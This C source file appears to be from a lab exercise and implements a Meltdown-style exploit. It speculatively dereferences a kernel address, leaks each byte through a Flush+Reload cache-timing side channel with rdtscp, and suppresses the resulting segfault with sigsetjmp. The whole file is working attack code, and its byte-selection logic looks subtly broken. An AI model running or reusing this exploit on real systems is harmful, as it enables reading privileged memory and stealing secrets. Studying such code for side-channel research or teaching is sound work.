/*
	Attempts to read bytes at an address	
*/

#include <stdio.h>
#include <setjmp.h> //sigjump_buf
#include <signal.h> // signal handler
#include <string.h>
#include <stdint.h>
#include <emmintrin.h> // _mm_clfush()
#include <x86intrin.h>
#include <fcntl.h> // for open() the /proc file
#include <unistd.h> // pread() /proc file

#define PAGE_SIZE 4096
#define PROBE_N 256
#define CACHE_HIT_THRESHOLD 100
#define DELTA 1024 // to reduce bias toward 0
#define ITER_N 1000

static char* pic_bytes = NULL; // just to verify accuracy

// using the same technique from cache-time.c/flush-reload.c
uint8_t probe_array[PROBE_N * PAGE_SIZE];
static int scores[PROBE_N];

static sigjmp_buf jbuf;

// signal handler on a segmentation fault
static void catch_segv() {

	// siglongjmp(sigjump_buf, return value)
	siglongjmp(jbuf, 1); // return to the checkpoint set when sigsetjump() was called ; restores context
	// return val is 1 so that the if statement goes to the else clause when returning
}

void probe() {
	// time accesses to each element in the probe_array	
	unsigned int junk = 0; // ???
	register uint64_t start, total_cycles;
	volatile uint8_t* addr; // 8-bit pointer = byte pointer

	int i;
	for(i=0; i<PROBE_N; i++) {
		addr = &probe_array[i * PAGE_SIZE]; 
		start = __rdtscp(&junk); // read time stamp before the memory read
		junk = *addr; // read value
		total_cycles = __rdtscp(&junk) - start;	
		if(total_cycles < CACHE_HIT_THRESHOLD) scores[i]++; 
	}
}

int read_bytes(char* file) {
	
	FILE* fd = fopen(file, "rb"); // open the image file
	if(!fd) {
		perror("Failed to load picture.\n");
		return -1;
	}
	printf("%s loaded.\n", file);

	// get file bytes_n
	fseek(fd, 0, SEEK_END); // goes to the end of file
	long bytes_n = ftell(fd); // read the position in the file

	pic_bytes = (char*) malloc(bytes_n); // allocate a buffer for image bytes
	printf("Loaded image file (%lu bytes ; %lu KB)\n", bytes_n, bytes_n/1024); 

	rewind(fd); // move to beginning of file
	fread(pic_bytes, 1, bytes_n, fd); // read file contents
	fclose(fd); // close image file

	return bytes_n;

}

int main(int argc, char* argv[]) {

	if(argc != 3 && argc != 4) {
		printf("./attacker <address> <num bytes to read> <correct img file>\n");
		return 1;	
	}
	
	unsigned long addr = strtoul(argv[1], NULL, 16);
	int read_n = atoi(argv[2]);
	char* file = NULL;
	if(argv[3]) {
		file = argv[3]; // just to measure accuracy
		read_bytes(file);
	}

	printf("Reading %i bytes from address %p\n", read_n, addr);

	// register signal handler for seg fault
	signal(SIGSEGV, catch_segv);

	// open kernel /proc file
	int fd = open("/dev/pic_kernel", O_RDONLY);
	if(fd < 0) {
		perror("Failed to open /proc file.\n");
		return -1;
	}	

	/* Same technique as cache-time.c/flush-reload.c */

//	printf("%-12s %-12s %-12s %-12s\n", "Byte #", "Guess (b)", "Hits", "Total Iterations");

	int c, i, iter, correct=0;
	for(c=0; c<read_n; c++) { // for each char in secret
		memset(scores, 0, PROBE_N * sizeof(int)); // reset scores

		for(iter=0; iter<ITER_N; iter++) {
			
			// initialize the probe_array
			for(i=0; i<PROBE_N; i++) { // only going down a single column in probe array ; these are the only elements we access
				probe_array[i * PAGE_SIZE] = 1;	
			}

			// flush probe_array from CPU cache
			for(i=0; i<PROBE_N; i++) {
				// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
				_mm_clflush(&probe_array[i * PAGE_SIZE]);
			}		
			
			// bring victim data into the cache
			int ret = pread(fd, NULL, 1, c); // triggers the proc_read() function in kernel to be executed

			// creates a checkpoint ; context is saved in sigjump_buf jbuf
			if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
				// cause seg fault
				char byte;
				asm volatile( // keep %eax busy? give CPU something to do while memory request is speculatively being serviced
					".rept 400;"
					"add $0x141, %%rax;"
					".endr;"
					
					:
					:
					: "rax"
				);

				byte = *(char*)addr;
				probe_array[byte * PAGE_SIZE] = 1; 
				printf("Muahaha, I got the secret: %c\n", byte); // should never execute
			}
			probe(); 
		} // iter ; end
		unsigned char max = 0;
		for(i=0; i<PROBE_N; i++) {
			if(scores[i] > max) max = i;
		}
		//printf("%-12i %-12x %-12i %-12i\n", c, max, scores[max], ITER_N);
		if(file) {
			if(c != 0 && c % 16 == 0) printf("\n");
			if(max != pic_bytes[c]) printf("__ ");
			else {
				printf("%02x ", max);
				correct++;
			}
		} else {
			if(c != 0 && c % 16 == 0) printf("\n");
			printf("%02x ", max);
		}
		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
		addr++; // move to next char
	} // c ; end
	printf("\n");
	if(file) printf("%i correct out of %i (%.2f%% accuracy)\n", correct, read_n, (float)correct/read_n * 100);
	
	return 0;
}
